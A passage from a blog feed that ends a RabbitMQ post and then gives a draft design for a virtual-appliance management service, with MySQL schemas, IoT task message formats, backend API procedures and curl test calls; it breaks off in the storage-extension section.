<li>生产者到RabbitMQ: Confirm机制 </li>
<li>RabbitMQ自身: 持久化(交换机和队列), 集群, 普通模式, 镜像模式 (TODO)</li>
<li>RabbitMQ到消费者: basicAck机制, 死信队列, 消息补偿机制</li>
</ul>
<p><a href="https://cloud.tencent.com/developer/article/2093640">https://cloud.tencent.com/developer/article/2093640</a></p>
]]></content>
      <categories>
        <category>RabbitMQ</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Service Gateway 项目设计</title>
    <url>/2025/0228201917.html</url>
    <content><![CDATA[<h1><span id="virtual-appliance-design">Virtual Appliance Design</span></h1><p><img data-src="/2025/0228201917/va_design.png"></p>
<h1><span id="heartbeart">heartbeart</span></h1><p><img data-src="/2025/0228201917/va_auto_upgrade.png"></p>
<span id="more"></span>

<h1><span id="overview">Overview</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frontend -------&gt;  backend ---------&gt; MQ -----------&gt;  VA(On-premise)</span><br><span class="line">                       /|\                             |  </span><br><span class="line">                        |------------------------------|</span><br><span class="line">						</span><br><span class="line">peter.backend.com:443  backend</span><br><span class="line">peter.channel.com:5672 MQ</span><br><span class="line">peter.frontend.com     frontend</span><br></pre></td></tr></table></figure>

<h1><span id="test-api">Test API</span></h1><h2><span id="api-for-frontend">API for frontend</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c9561c8d47fb8036c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/?start=0&amp;applianceId=974bf535-7930-474e-8da6-780cafff284d&quot;</span><br><span class="line">curl -H &quot;x-customer-id: 77a1c9561c8d47fb8036c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/?start=1736680946&quot;</span><br><span class="line">curl https://peter.backend.com/ui/appliances/image/</span><br><span class="line">curl -X DELETE https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/</span><br><span class="line">curl -X POST https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/upgrade/</span><br><span class="line">curl https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/settings/</span><br><span class="line">curl -H &quot;x-customer-id: 77a1c9561c8d47fb8036c970a4f2ee73&quot; -X POST https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/settings/</span><br><span class="line">curl https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/storage/</span><br><span class="line">curl -X POST https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/storage/</span><br><span class="line">curl -X POST https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/log/</span><br><span class="line">curl https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/services/</span><br><span class="line"></span><br><span class="line">curl -X POST https://peter.backend.com/ui/services/squid/install/</span><br><span class="line">curl -X POST https://peter.backend.com/ui/services/squid/974bf535-7930-474e-8da6-780cafff284d/toggle/</span><br><span class="line">curl https://peter.backend.com/ui/services/squid/974bf535-7930-474e-8da6-780cafff284d/settings/</span><br><span class="line">curl -X POST https://peter.backend.com/ui/services/squid/974bf535-7930-474e-8da6-780cafff284d/settings/</span><br><span class="line"></span><br><span class="line">curl https://peter.backend.com/ui/tasks/12345/</span><br></pre></td></tr></table></figure>

<h2><span id="api-for-va">API for VA</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Authorization: Bearer $token&quot; -i https://peter.backend.com/va/register/</span><br><span class="line">curl -X POST https://peter.backend.com/va/register/</span><br><span class="line">curl -X POST https://peter.backend.com/va/974bf535-7930-474e-8da6-780cafff284d/tasks/</span><br><span class="line">curl https://peter.backend.com/va/974bf535-7930-474e-8da6-780cafff284d/healthz/</span><br><span class="line">curl -X POST https://peter.backend.com/va/974bf535-7930-474e-8da6-780cafff284d/log/</span><br><span class="line">curl -X POST https://peter.backend.com/va/974bf535-7930-474e-8da6-780cafff284d/squid/metrics/</span><br></pre></td></tr></table></figure>

<h1><span id="backend-design">backend Design</span></h1><h2><span id="database-design">Database Design</span></h2><h3><span id="customer">Customer</span></h3><p>Customer表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc app_customer;</span><br><span class="line">+----------------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field          | Type        | Null | Key | Default | Extra |</span><br><span class="line">+----------------+-------------+------+-----+---------+-------+</span><br><span class="line">| id             | char(32)    | NO   | PRI | NULL    |       |</span><br><span class="line">| register_token | longtext    | NO   |     | NULL    |       |</span><br><span class="line">| created_at     | datetime(6) | NO   |     | NULL    |       |</span><br><span class="line">| updated_at     | datetime(6) | NO   |     | NULL    |       |</span><br><span class="line">+----------------+-------------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure>

<h3><span id="appliance">Appliance</span></h3><p>ApplianceInfo表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc app_applianceinfo;</span><br><span class="line">+--------------------+-------------+------+-----+----------------+-------------------+</span><br><span class="line">| Field              | Type        | Null | Key | Default        | Extra             |</span><br><span class="line">+--------------------+-------------+------+-----+----------------+-------------------+</span><br><span class="line">| id                 | char(32)    | NO   | PRI | NULL           |                   |</span><br><span class="line">| customer_id        | char(32)    | NO   | MUL | NULL           |                   |</span><br><span class="line">| created_at         | datetime(6) | NO   |     | NULL           |                   |</span><br><span class="line">| updated_at         | datetime(6) | NO   |     | NULL           |                   |</span><br><span class="line">| version            | varchar(16) | NO   |     | NULL           |                   |</span><br><span class="line">| status             | varchar(16) | NO   |     | NULL           |                   |</span><br><span class="line">| appliance_settings | json        | NO   |     | NULL           |                   |</span><br><span class="line">| capacity           | json        | NO   |     | _utf8mb3\&#x27;&#123;&#125;\&#x27; | DEFAULT_GENERATED |</span><br><span class="line">| connect_time       | bigint      | NO   | MUL | NULL           |                   |</span><br><span class="line">| expected_status    | varchar(16) | NO   |     | NULL           |                   |</span><br><span class="line">+--------------------+-------------+------+-----+----------------+-------------------+</span><br></pre></td></tr></table></figure>

<p>ApplianceVersion表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc app_applianceversion;</span><br><span class="line">+------------------+-------------+------+-----+----------------+-------------------+</span><br><span class="line">| Field            | Type        | Null | Key | Default        | Extra             |</span><br><span class="line">+------------------+-------------+------+-----+----------------+-------------------+</span><br><span class="line">| version          | varchar(32) | NO   | PRI | NULL           |                   |</span><br><span class="line">| created_at       | datetime(6) | NO   |     | NULL           |                   |</span><br><span class="line">| updated_at       | datetime(6) | NO   |     | NULL           |                   |</span><br><span class="line">| version_major    | int         | NO   | MUL | NULL           |                   |</span><br><span class="line">| version_minor    | int         | NO   | MUL | NULL           |                   |</span><br><span class="line">| version_revision | int         | NO   | MUL | NULL           |                   |</span><br><span class="line">| version_build    | int         | NO   | MUL | NULL           |                   |</span><br><span class="line">| display_version  | varchar(32) | NO   |     | NULL           |                   |</span><br><span class="line">| firmware_info    | json        | NO   |     | NULL           |                   |</span><br><span class="line">| enable           | tinyint(1)  | NO   |     | NULL           |                   |</span><br><span class="line">| ova_info         | json        | NO   |     | _utf8mb3\&#x27;&#123;&#125;\&#x27; | DEFAULT_GENERATED |</span><br><span class="line">| published        | tinyint(1)  | NO   |     | NULL           |                   |</span><br><span class="line">+------------------+-------------+------+-----+----------------+-------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc app_appliancemetrics;</span><br><span class="line">+-------------------------+----------+------+-----+---------+----------------+</span><br><span class="line">| Field                   | Type     | Null | Key | Default | Extra          |</span><br><span class="line">+-------------------------+----------+------+-----+---------+----------------+</span><br><span class="line">| id                      | bigint   | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| appliance_id            | char(32) | NO   | MUL | NULL    |                |</span><br><span class="line">| record_time             | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| cpu_used                | double   | NO   |     | NULL    |                |</span><br><span class="line">| memory_total            | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| memory_used             | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| storage_total           | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| storage_used            | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| storage_unallocated     | bigint   | NO   |     | NULL    |                |</span><br><span class="line">| storage_capacity_detail | json     | NO   |     | NULL    |                |</span><br><span class="line">| storage_usage_detail    | json     | NO   |     | NULL    |                |</span><br><span class="line">+-------------------------+----------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure>

<h3><span id="iot-task">IOT Task</span></h3><p>IotTask表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc app_iottask;</span><br><span class="line">+---------------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field         | Type        | Null | Key | Default | Extra |</span><br><span class="line">+---------------+-------------+------+-----+---------+-------+</span><br><span class="line">| id            | char(32)    | NO   | PRI | NULL    |       |</span><br><span class="line">| created_at    | datetime(6) | NO   | MUL | NULL    |       |</span><br><span class="line">| updated_at    | datetime(6) | NO   |     | NULL    |       |</span><br><span class="line">| task_type     | varchar(50) | NO   | MUL | NULL    |       |</span><br><span class="line">| appliance_id  | char(32)    | NO   | MUL | NULL    |       |</span><br><span class="line">| customer_id   | char(32)    | NO   |     | NULL    |       |</span><br><span class="line">| message       | json        | NO   |     | NULL    |       |</span><br><span class="line">| status        | varchar(16) | NO   |     | NULL    |       |</span><br><span class="line">| retry_count   | int         | NO   |     | NULL    |       |</span><br><span class="line">| result        | json        | NO   |     | NULL    |       |</span><br><span class="line">| error_message | longtext    | NO   |     | NULL    |       |</span><br><span class="line">+---------------+-------------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure>

<p>HeartbeatIotTask表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc app_heartbeatiottask;</span><br><span class="line">+---------------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field         | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+---------------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id            | bigint      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| created_at    | datetime(6) | NO   | MUL | NULL    |                |</span><br><span class="line">| updated_at    | datetime(6) | NO   |     | NULL    |                |</span><br><span class="line">| appliance_id  | char(32)    | NO   | MUL | NULL    |                |</span><br><span class="line">| customer_id   | char(32)    | NO   |     | NULL    |                |</span><br><span class="line">| message       | json        | NO   |     | NULL    |                |</span><br><span class="line">| status        | varchar(16) | NO   | MUL | NULL    |                |</span><br><span class="line">| result        | json        | NO   |     | NULL    |                |</span><br><span class="line">| error_message | longtext    | NO   |     | NULL    |                |</span><br><span class="line">+---------------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure>

<h3><span id="service">Service</span></h3><h2><span id="iottask-design">IotTask Design</span></h2><ul>
<li>install&#x2F;uninstall&#x2F;enable&#x2F;disable&#x2F;configure services</li>
<li>upgrade firmware&#x2F;services</li>
<li>collect metrics about va and services<ul>
<li>va’s cpu,memory, storage, network usage</li>
<li>maintain service status(running, disabled, disconnected)</li>
</ul>
<p>	</p>
</li>
<li>heartbeart</li>
<li>collect debug logs</li>
<li>collect metrics</li>
<li>extend storage</li>
<li>change api key and server ssl certificates</li>
<li>remote shell</li>
</ul>
<h3><span id="heartbeat">HeartBeat</span></h3><p>use applianceId as taskId to avoid database overwhelm<br><strong>Heartbeat Body</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: applianceId,</span><br><span class="line">	&quot;taskType&quot;: </span><br><span class="line">	&quot;serverTime&quot;: 1736588457</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Heartbeat Result</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3><span id="upgrade-appliance">Upgrade Appliance</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskType&quot;: &quot;upgradeAppliance&quot;,</span><br><span class="line">	&quot;targetVersion&quot;: &quot;1.0.0.100&quot;,</span><br><span class="line">	&quot;firmwarePath&quot;: &quot;https://XXX/&quot;,</span><br><span class="line">	&quot;firmwareSha256&quot;: &quot;XXX&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="install-services">Install Services</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskType&quot;: &quot;installService&quot;,</span><br><span class="line">	&quot;serviceCode&quot;: &quot;va-squid&quot;,</span><br><span class="line">	&quot;targetVersion&quot;: &quot;1.0.0.10000&quot;,</span><br><span class="line">	&quot;branch&quot;: &quot;main&quot;,</span><br><span class="line">	&quot;imagePath&quot;: &quot;download_url&quot;,</span><br><span class="line">	&quot;imageSha256&quot;: &quot;sha256sum&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="uninstall-services">Uninstall Services</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskType&quot;: &quot;installService&quot;,</span><br><span class="line">	&quot;serviceCode&quot;: &quot;va-squid&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="collect-log">Collect log</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;start&quot;: &quot;2021-01-01&quot;,</span><br><span class="line">	&quot;end&quot;: &quot;2021-02-02&quot;,</span><br><span class="line">	&quot;uploadPath&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="collect-appliance-metrics">Collect Appliance Metrics</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="unregister-va">Unregister VA</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskType&quot;: &quot;unregister&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="update-appliance-settings">Update Appliance Settings</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskType&quot;: &quot;updateApplianceConfig&quot;,</span><br><span class="line">	&quot;body&quot;: &#123;</span><br><span class="line">		&quot;settings1&quot;: &quot;value1&quot;,</span><br><span class="line">		&quot;settingsn&quot;: &quot;valuen&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="extend-appliance-storage">Extend Appliance Storage</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;storage&quot;: &#123;</span><br><span class="line">		&quot;extend&quot;: [</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;targetVolume&quot;: &quot;data | image&quot;,</span><br><span class="line">				&quot;size&quot;: 1024</span><br><span class="line">			&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2><span id="backend-api-design">backend API design</span></h2><h3><span id="api-for-va">API for VA</span></h3><h4><span id="va-register">VA register</span></h4><p>POST &#x2F;va&#x2F;register</p>
<ul>
<li>VA发起注册请求, Header中携带JWT</li>
<li>校验请求头的JWT<ul>
<li>解析JWT中的customer_id, 查数据库是否存在该customer</li>
<li>检查JWT是否过期，如果过期就为客户重新生成一个新的JWT，继续校验</li>
</ul>
</li>
<li>从请求体中读取VA信息，将VA信息写入数据库</li>
<li>响应VA，返回(iotHost, iotCert, applianceId)给VA。</li>
</ul>
<p><strong>Response Body</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;applianceId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;applianceToken&quot;: &quot;&quot;,</span><br><span class="line">	&quot;iotHost&quot;: &quot;peter.channel.com&quot;</span><br><span class="line">	&quot;iotPort&quot;: 5672</span><br><span class="line">	&quot;message&quot;: &quot;error message...&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="update-iot-task-results">Update IOT Task Results</span></h4><p>POST &#x2F;va&#x2F;{appliance_id}&#x2F;tasks</p>
<p><strong>Request Body</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;uuid&quot;,</span><br><span class="line">	&quot;taskStatus&quot;: &quot;success | failed | ignored&quot;,</span><br><span class="line">	&quot;errorMessage&quot;: &quot;&quot;,</span><br><span class="line">	&quot;taskResult&quot;: &#123;</span><br><span class="line">		&quot;field1&quot;: ...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="iot-health-check">IOT Health Check</span></h4><p>GET &#x2F;va&#x2F;{appliance_id}&#x2F;healthz</p>
<h4><span id="upload-service-metrics">Upload Service Metrics</span></h4><p>POST &#x2F;va&#x2F;{appliance_id}&#x2F;{service_code&gt;&#x2F;metrics</p>
<h3><span id="upload-audit-log">Upload Audit Log</span></h3><p>POST &#x2F;var&#x2F;{appliance_id}&#x2F;log</p>
<h3><span id="api-for-frontend">API for frontend</span></h3><p><font color="red"><strong>Appliance Management</strong></font></p>
<h4><span id="get-appliance-image-info">Get Appliance Image Info</span></h4><p>GET &#x2F;ui&#x2F;appliances&#x2F;image</p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header</li>
<li>query latest published version from DB</li>
<li>recreate customer token if expired </li>
<li>get ova s3 download link valid for 7 days.</li>
<li>response image info</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">	&quot;displayVersion&quot;: &quot;1.0.0&quot;,</span><br><span class="line">	&quot;registrationToken&quot;: &quot;&quot;,</span><br><span class="line">	&quot;packages&quot;: &#123;</span><br><span class="line">		&quot;ovaDownloadLink&quot;: &quot;string&quot;,</span><br><span class="line">		&quot;ovaName&quot;: &quot;&quot;,</span><br><span class="line">		&quot;ovaSize&quot;: &quot;string&quot;,</span><br><span class="line">		&quot;ovaSha256&quot;: &quot;string&quot;,</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong><br>add fake DB data</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into app_applianceversion(version, created_at, updated_at, version_major, version_minor, version_revision, version_build, display_version, firmware_info, enable, ova_info, published) values(&#x27;1.0.0.10000&#x27;, now(), now(), 1, 0, 0, 10000, &#x27;1.0.0&#x27;, &#x27;&#123;&#125;&#x27;, 1, &#x27;&#123;&#125;&#x27;, 1);</span><br><span class="line">insert into app_applianceversion(version, created_at, updated_at, version_major, version_minor, version_revision, version_build, display_version, firmware_info, enable, ova_info, published) values(&#x27;2.0.0.10000&#x27;, now(), now(), 2, 0, 0, 10000, &#x27;2.0.0&#x27;, &#x27;&#123;&#125;&#x27;, 1, &#x27;&#123;&#125;&#x27;, 1);</span><br></pre></td></tr></table></figure>
<p>test API</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/image/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="list-appliance">List Appliance</span></h4><p>GET &#x2F;ui&#x2F;appliances</p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header</li>
<li>parse applianceId, connectStartTime from request params</li>
<li>Query appliances which expectedStatus are not unregistered from DB, then response</li>
</ul>
<p><strong>Request Params</strong></p>
<table>
<thead>
<tr>
<th>param</th>
<th>optional</th>
<th>example</th>
<th>description</th>
</tr>
</thead>
<tbody><tr>
<td>start</td>
<td>True</td>
<td>1700020200</td>
<td>filter register time of appliances</td>
</tr>
<tr>
<td>applianceId</td>
<td>True</td>
<td>uuid</td>
<td></td>
</tr>
</tbody></table>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;data&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;applianceId&quot;: uuid,</span><br><span class="line">			&quot;hostname&quot;: &quot;localhost&quot;,</span><br><span class="line">			&quot;ipv4Address&quot;: &quot;1.2.3.4&quot;,</span><br><span class="line">			&quot;status&quot;: &quot;preparing | running | disconnected | upgrading&quot;,</span><br><span class="line">			&quot;upgradeStatus&quot;: &quot;downloading | upgrading&quot;,		// optional</span><br><span class="line">			&quot;logCollectStatus&quot;: &quot;packaging | uploading&quot;,</span><br><span class="line">			&quot;version&quot;: &quot;2.0.0&quot;,</span><br><span class="line">			&quot;installedServiceList&quot;: [</span><br><span class="line">				&#123;</span><br><span class="line">					&quot;serviceCode&quot;: &quot;squid&quot;,</span><br><span class="line">					&quot;version&quot;: &quot;1.1.1&quot;,</span><br><span class="line">					&quot;healthStatus&quot;: &quot;healthy | unhealthy&quot;,</span><br><span class="line">					&quot;fullName&quot;: &quot;Squid&quot;,</span><br><span class="line">					&quot;description&quot;: &quot;Forward Proxy&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">			],</span><br><span class="line">			&quot;lastConnectedTime&quot;: 1700020200,</span><br><span class="line">			&quot;upgradeStartedTime&quot;: 1700020200, // if upgradeStartedTime exists, appliance is upgrading</span><br><span class="line">			&quot;totalStorage&quot;: 1024576,</span><br><span class="line">			&quot;usedStorage&quot;: 10240,</span><br><span class="line">			&quot;totalCpu&quot;: 8,</span><br><span class="line">			&quot;totalMemory&quot;: 16384</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Query customer&#x27;s appliances</span><br><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/&quot;</span><br><span class="line"></span><br><span class="line"># Query specified appliance</span><br><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/?start=1736680946&quot;</span><br><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/?start=1736680946&amp;applianceId=974bf535-7930-474e-8da6-780cafff284d&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="delete-appliance">Delete Appliance</span></h4><p>DELETE &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header</li>
<li>query delete appliance from DB, customer can only delete their own appliance </li>
<li>delete this appliance  <ul>
<li>update expectedStatus and status to unregistered</li>
<li>send unregister iottask</li>
</ul>
</li>
</ul>
<p><strong>Response</strong><br>empty</p>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X DELETE -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/&quot;</span><br></pre></td></tr></table></figure>


<h4><span id="upgrade-appliance">Upgrade Appliance</span></h4><p>POST &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;upgrade</appliance_id></p>
<h4><span id="get-appliance-settings">Get Appliance Settings</span></h4><p>GET &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;settings</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header</li>
<li>query appliance settings from DB, such as schedule time, cert info</li>
<li>resp appliance settings</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;nextUpdateTime&quot;: 164800000,</span><br><span class="line">	&quot;scheduleUpdateDay&quot;: 0 | 1,</span><br><span class="line">	&quot;scheduleUpdateTime&quot;: &quot;23:00&quot;,</span><br><span class="line">	&quot;certInfo&quot;: &#123;</span><br><span class="line">		&quot;subject&quot;: &quot;&quot;,</span><br><span class="line">		&quot;issuedBy&quot;: &quot;&quot;,</span><br><span class="line">		&quot;issueTo&quot;: &quot;&quot;,</span><br><span class="line">		&quot;validFrom&quot;: &quot;&quot;,</span><br><span class="line">		&quot;validTo&quot;: &quot;&quot;,</span><br><span class="line">		&quot;expired&quot;: True | False,</span><br><span class="line">		&quot;certContent&quot;: &quot;&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;defaultCertInfo&quot;: &#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/settings/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="modify-appliance-settings">Modify Appliance Settings</span></h4><p>POST &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;settings</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header, customer can only modify their own appliance’s settings</li>
<li>parse settings, update va settings to DB</li>
<li>notify va, response task_id to</li>
</ul>
<p><strong>Request body</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;certContent&quot;: &quot;&quot;,</span><br><span class="line">	&quot;scheduleUpdateTime&quot;: &quot;XX:XX&quot;,</span><br><span class="line">	&quot;hostname&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;taskId&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type:application/json&quot; -d  &#x27;&#123;&quot;scheduleUpdateTime&quot; : &quot;23:00&quot;&#125;&#x27; -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; \</span><br><span class="line">&quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/settings/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="get-storage-details">Get Storage Details</span></h4><p>GET &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;storage</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header, customer can only get their own appliance’s storage</li>
<li>query storage details from DB table appliance_metric</li>
<li>response storage details</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;total&quot;: 1000000,</span><br><span class="line">	&quot;unallocated&quot;: 1000,</span><br><span class="line">	&quot;used&quot;: 1024,</span><br><span class="line">	&quot;usedDetail&quot;: &#123;</span><br><span class="line">		&quot;data&quot;:	100,</span><br><span class="line">		&quot;image&quot;: 200,</span><br><span class="line">		&quot;system&quot;: 300,</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;totalDetail&quot;: &#123;</span><br><span class="line">		&quot;data&quot;: 1024,</span><br><span class="line">		&quot;image&quot;: 1024,</span><br><span class="line">		&quot;system&quot;: 1024,</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;extendOngoing&quot;: true | false	# 上一个extendTask是否在执行中</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; \</span><br><span class="line">&quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/storage/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="extend-storage">Extend Storage</span></h4><p>POST &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;storage</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>check customer_id in request header, customer can only get their own appliance’s storage</li>
<li>validate request, parse extend storage detail</li>
<li>if previous task is ongoing, response failure</li>
<li>notify VA to extend storage</li>
<li>response 200 OK</li>
</ul>
<p><strong>Request</strong></p>
